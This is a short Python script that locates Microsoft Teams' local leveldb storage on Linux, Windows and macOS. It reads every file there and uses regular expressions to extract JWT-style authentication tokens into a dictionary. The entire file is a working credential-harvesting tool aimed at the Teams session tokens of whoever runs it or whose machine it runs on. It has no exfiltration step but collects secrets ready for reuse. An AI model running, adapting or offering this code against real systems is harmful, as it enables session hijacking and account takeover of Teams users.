#!/usr/bin/python3
import re
import os
import platform


# Functions
def get_teams_storage(system):
    home = os.environ['HOME']
    teams_dir = home

    match system:
        case "Linux":
            teams_dir += '/.config/Microsoft/Microsoft Teams/Local Storage/leveldb'
        case "Windows":
            teams_dir +=  '/AppData/Roaming/Microsoft/Teams/Local Storage/leveldb'
        case "Darwin":
            teams_dir +=  '/Library/Application Support/Microsoft/Teams/Local Storage/leveldb'

    return teams_dir


def get_teams_tokens():
    # Variables
    tokens = {}
    generic_regex = "\w*\.\w*\.\w*"
    token_regex = "ey\w*\.\w*\.\w*"
    system = platform.system()

    # Get the local storage
    local_storage_path = get_teams_storage(system)
    os.chdir(local_storage_path)

    # Look for active tokens across all files 
    dir_files = os.listdir()
    for file in dir_files:

        # Get the file contents
        teams_file = open(file, 'rb')

        # Convert all bytes into ascii and pushinto string
        teams_binary = bytearray(teams_file.read())
        file_string = str(teams_binary, 'utf-8', errors="ignore")

        # Close the file, to be nice.
        teams_file.close()

        # Find all matches against the generic regex
        matches = re.findall(generic_regex, file_string)

        # Process findings to determine token alignment
        count = 0
        for find in matches:
            count += 1

            if count < len(matches):
                if re.search(token_regex, matches[count]):
                    tokens[find] = matches[count]

    return tokens
